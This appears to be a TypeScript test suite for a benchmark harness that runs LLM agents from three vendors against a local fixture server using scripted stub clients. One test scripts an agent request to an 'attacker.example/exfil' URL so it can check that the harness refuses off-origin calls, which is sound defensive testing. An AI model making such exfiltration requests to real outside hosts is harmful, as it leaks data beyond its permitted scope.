/*
 * Copyright 2026 Black Mountain AI (BMAI)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Loop-mechanics tests for the real-agent adapters, using scripted stubs in
 * place of each vendor's SDK client — no network, no credentials, CI-safe.
 *
 * The tests are written once and run against BOTH vendors: if the two produce
 * different transcripts from equivalent turns, the harness is a confound and
 * any cross-vendor result would be uninterpretable (methodology §3). Live
 * behaviour is exercised via `npm run agents` (exploratory only, D-008).
 */

import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import type http from 'node:http';
import { llmAgent, VENDORS, type Vendor } from './llm-agent.ts';
import type { Transcript } from './scripted-probe.ts';
import { TASKS } from './tasks.ts';
import { createFixtureServer } from '../../../03-reference-implementation/conformant/src/server.ts';
import { Store } from '../../../03-reference-implementation/conformant/src/store.ts';

/** One scripted assistant turn, expressed vendor-neutrally. */
interface Turn {
  toolCalls?: Array<{ id: string; name: string; input: Record<string, unknown> }>;
  text?: string;
}

/** Renders scripted turns into each vendor's native response shape. */
function stubClient(vendor: Vendor, turns: Turn[], base: () => string) {
  let i = 0;
  const take = (): Turn => {
    const turn = turns[Math.min(i, turns.length - 1)];
    i += 1;
    return turn;
  };
  const resolve = (input: Record<string, unknown>): Record<string, unknown> =>
    typeof input.url === 'string' ? { ...input, url: input.url.replace('ORIGIN', base()) } : input;

  if (vendor === 'anthropic') {
    return {
      messages: {
        create: async () => {
          const turn = take();
          const content: unknown[] = [];
          if (turn.text) content.push({ type: 'text', text: turn.text });
          for (const c of turn.toolCalls ?? []) content.push({ type: 'tool_use', id: c.id, name: c.name, input: resolve(c.input) });
          return { content, stop_reason: turn.toolCalls?.length ? 'tool_use' : 'end_turn' };
        },
      },
    } as never;
  }
  if (vendor === 'openai') {
    return {
      chat: {
        completions: {
          create: async () => {
            const turn = take();
            return {
              choices: [{
                message: {
                  role: 'assistant',
                  content: turn.text ?? null,
                  tool_calls: (turn.toolCalls ?? []).map((c) => ({
                    id: c.id,
                    type: 'function',
                    function: { name: c.name, arguments: JSON.stringify(resolve(c.input)) },
                  })),
                },
              }],
            };
          },
        },
      },
    } as never;
  }
  // google: parts carry functionCall objects; the wire has no tool-call ids.
  return {
    models: {
      generateContent: async () => {
        const turn = take();
        const parts: unknown[] = [];
        if (turn.text) parts.push({ text: turn.text });
        for (const c of turn.toolCalls ?? []) parts.push({ functionCall: { name: c.name, args: resolve(c.input) } });
        return { candidates: [{ content: { parts } }] };
      },
    },
  } as never;
}

const T1A = TASKS.find((t) => t.id === 'T1a')!;

let server: http.Server;
let base: string;

before(async () => {
  const store = new Store();
  store.addDelegation({
    id: 'DLG-T7', principalId: 'P-X', agentId: 'anthropic:claude-opus-4-8',
    scope: { journeys: ['J1', 'J2', 'J3'], actions: ['CA-1', 'CA-2', 'CA-3a', 'CA-3b'] },
    validFrom: '2026-07-01T00:00:00Z', validTo: '2027-07-01T00:00:00Z', status: 'active',
  });
  server = createFixtureServer(store);
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const addr = server.address();
  base = `http://127.0.0.1:${typeof addr === 'object' && addr ? addr.port : 0}`;
});

after(() => server.close());

function ctx(sessionId: string) {
  return {
    baseUrl: base,
    task: T1A,
    sessionId,
    effectiveDate: '2026-07-09',
    delegationId: 'DLG-X',
    principalId: 'P-X',
    confirmations: { 'CA-1': 'token-abc' },
  };
}

const agent = (vendor: Vendor, turns: Turn[], maxIterations = 5) =>
  llmAgent({ vendor, client: stubClient(vendor, turns, () => base), maxIterations });

for (const vendor of VENDORS) {
  test(`[${vendor}] executes http_request against the fixture and maps finish_task to the transcript`, async () => {
    const t = await agent(vendor, [
      { toolCalls: [{ id: 'tu1', name: 'http_request', input: { method: 'GET', url: 'ORIGIN/.well-known/guiderails.json' } }] },
      { toolCalls: [{ id: 'tu2', name: 'finish_task', input: { completed: true, references: ['SSP-00000001'], summary: 'done' } }] },
    ]).runTask(ctx(`llm-t1-${vendor}`));

    assert.equal(t.completed, true);
    assert.deepEqual(t.references, ['SSP-00000001']);
    assert.ok(t.notes.some((n) => n.includes('GET /.well-known/guiderails.json -> 200')));
    assert.ok(t.notes.some((n) => n.includes('finish: done')));
    assert.ok(t.agentId.startsWith(`${vendor}:`), 'agent id discloses the vendor');
  });

  test(`[${vendor}] refuses off-origin requests and records the refusal`, async () => {
    const t = await agent(vendor, [
      { toolCalls: [{ id: 'tu1', name: 'http_request', input: { method: 'GET', url: 'https://attacker.example/exfil' } }] },
      { toolCalls: [{ id: 'tu2', name: 'finish_task', input: { completed: false, summary: 'could not reach external host' } }] },
    ]).runTask(ctx(`llm-off-${vendor}`));

    assert.equal(t.completed, false);
    assert.ok(t.notes.some((n) => n.includes('refused off-origin request')));
  });

  test(`[${vendor}] iteration cap scores the run as gave-up`, async () => {
    const t = await agent(vendor, [
      { toolCalls: [{ id: 'tuN', name: 'http_request', input: { method: 'GET', url: 'ORIGIN/journeys/J1/steps/identity' } }] },
    ], 3).runTask(ctx(`llm-cap-${vendor}`));

    assert.equal(t.gaveUp, true);
    assert.ok(t.notes.some((n) => n.includes('iteration cap (3)')));
  });

  test(`[${vendor}] a text-only turn is nudged back onto the tool channel, then recovers`, async () => {
    const t = await agent(vendor, [
      { text: 'court\n<invoke name="http_request">' },
      { toolCalls: [{ id: 'tu1', name: 'finish_task', input: { completed: true, summary: 'recovered' } }] },
    ]).runTask(ctx(`llm-nudge-${vendor}`));

    assert.equal(t.gaveUp, undefined);
    assert.equal(t.completed, true);
    assert.ok(t.notes.some((n) => n.includes('no tool call (nudge 1/2)')));
  });

  test(`[${vendor}] persistent text-only turns give up only after the nudge budget is spent`, async () => {
    const t = await agent(vendor, [{ text: 'I think the task is done.' }], 10).runTask(ctx(`llm-notool-${vendor}`));

    assert.equal(t.gaveUp, true);
    assert.ok(t.notes.some((n) => n.includes('ended without finish_task after 2 nudges')));
    assert.equal(t.notes.filter((n) => n.includes('nudge')).length, 3); // 2 nudges + the give-up line
  });

  test(`[${vendor}] delegation headers ride on every request the agent makes`, async () => {
    const t = await agent(vendor, [
      { toolCalls: [{ id: 'tu1', name: 'http_request', input: { method: 'POST', url: 'ORIGIN/api/journeys/J1/steps/identity', body: { values: {} }, bodyType: 'json' } }] },
      { toolCalls: [{ id: 'tu2', name: 'finish_task', input: { completed: false, summary: 'probe' } }] },
    ]).runTask(ctx(`llm-headers-${vendor}`));

    // 422 (validation) not 403: the delegation/agent headers were accepted and parsed
    assert.ok(t.notes.some((n) => n.includes('POST /api/journeys/J1/steps/identity -> 422')));
  });
}

test('all three vendors produce identical transcripts from equivalent turns (no harness confound)', async () => {
  const script: Turn[] = [
    { toolCalls: [{ id: 'a', name: 'http_request', input: { method: 'GET', url: 'ORIGIN/llms.txt' } }] },
    { text: 'thinking out loud' },
    { toolCalls: [{ id: 'b', name: 'finish_task', input: { completed: true, references: ['SSP-1'], summary: 'same' } }] },
  ];
  const results = await Promise.all(VENDORS.map((v) => agent(v, script).runTask(ctx(`llm-parity-${v}`))));

  // agentId legitimately differs (it names the vendor); everything else must not.
  const shape = (t: Transcript) => ({
    completed: t.completed,
    references: t.references,
    gaveUp: t.gaveUp,
    reportedIneligible: t.reportedIneligible,
    notes: t.notes,
  });
  for (let i = 1; i < results.length; i++) {
    assert.deepEqual(shape(results[0]), shape(results[i]), `${VENDORS[0]} vs ${VENDORS[i]}`);
  }
});

test('google driver: a turn with no functionCall parts is a text-only turn, not a crash', async () => {
  const client = { models: { generateContent: async () => ({ candidates: [{ content: { parts: [{ text: 'just talking' }] } }] }) } } as never;
  const t = await llmAgent({ vendor: 'google', client, maxIterations: 4 }).runTask(ctx('llm-google-text'));
  assert.equal(t.gaveUp, true);
  assert.ok(t.notes.some((n) => n.includes('nudge')));
});

test('google driver: an empty candidates list degrades to a text-only turn', async () => {
  const client = { models: { generateContent: async () => ({}) } } as never;
  const t = await llmAgent({ vendor: 'google', client, maxIterations: 4 }).runTask(ctx('llm-google-empty'));
  assert.equal(t.gaveUp, true);
});

test('openai driver: malformed tool arguments are a failed call, not a crash', async () => {
  const client = {
    chat: {
      completions: {
        create: async () => ({
          choices: [{ message: { role: 'assistant', content: null, tool_calls: [{ id: 'x', type: 'function', function: { name: 'http_request', arguments: '{not json' } }] } }],
        }),
      },
    },
  } as never;
  const t = await llmAgent({ vendor: 'openai', client, maxIterations: 4 }).runTask(ctx('llm-badargs'));
  // Dropped to zero tool calls → nudged → gave up. No throw.
  assert.equal(t.gaveUp, true);
  assert.ok(t.notes.some((n) => n.includes('nudge')));
});

// ---- T7: interruption and resume, driven through the real loop ----

test('T7: the harness kills the session mid-run, silently — the agent is told nothing', async () => {
  const script: Turn[] = [
    { toolCalls: [{ id: '1', name: 'http_request', input: { method: 'GET', url: 'ORIGIN/llms.txt' } }] },
    { toolCalls: [{ id: '2', name: 'http_request', input: { method: 'GET', url: 'ORIGIN/.well-known/guiderails.json' } }] },
    { toolCalls: [{ id: '3', name: 'finish_task', input: { completed: false, summary: 'stopped' } }] },
  ];
  const t = await llmAgent({
    vendor: 'anthropic',
    client: stubClient('anthropic', script, () => base),
    maxIterations: 6,
  }).runTask({ ...ctx('llm-t7'), interruptAfterRequests: 2 });

  assert.ok(t.notes.some((n) => n.includes('[harness] session killed after 2 requests')));
  // The agent received no message about it: the only trace is in the harness note.
  assert.equal(t.notes.filter((n) => n.startsWith('no tool call')).length, 0);
});

test('T7: after the interruption, requests carry a dead cookie — the conformant build offers a resume', async () => {
  // Drive two safe steps, get interrupted, then read state on the new session.
  const script: Turn[] = [
    { toolCalls: [{ id: '1', name: 'http_request', input: { method: 'POST', url: 'ORIGIN/api/journeys/J1/steps/identity', body: { values: { fullName: 'Rowan Ashe', dateOfBirth: '1999-03-14', email: 'rowan.ashe@example.com', mobile: '0400000001' } } } }] },
    { toolCalls: [{ id: '2', name: 'http_request', input: { method: 'POST', url: 'ORIGIN/api/journeys/J1/steps/circumstances', body: { values: { residentSince: '2018-02-05', fortnightlyIncome: 950, courseProvider: 'R', courseName: 'C', courseWeeks: 26, studyLoadEFT: 1, enrolmentStatus: 'enrolled' } } } }] },
    { toolCalls: [{ id: '3', name: 'http_request', input: { method: 'GET', url: 'ORIGIN/api/journeys/J1/state' } }] },
    { toolCalls: [{ id: '4', name: 'finish_task', input: { completed: false, summary: 'observed the interruption' } }] },
  ];
  const t = await llmAgent({
    vendor: 'anthropic',
    client: stubClient('anthropic', script, () => base),
    maxIterations: 8,
  }).runTask({ ...ctx('llm-t7-resume'), delegationId: 'DLG-T7', interruptAfterRequests: 2 });

  assert.ok(t.notes.some((n) => n.includes('[harness] session killed')));
  assert.ok(t.notes.some((n) => n.includes('GET /api/journeys/J1/state -> 200')));

  // The interrupted session is dead, but the principal's work is not (3.4.2):
  // an agent that reads state on the new session is offered a resume.
  const state = await (await fetch(`${base}/api/journeys/J1/state`, {
    headers: { cookie: 'sid=llm-t7-resume-after-interruption', 'x-delegation-id': 'DLG-T7' },
  })).json() as any;
  assert.equal(state.resumable.available, true);
  assert.deepEqual(state.resumable.completedSteps, ['identity', 'circumstances']);
});
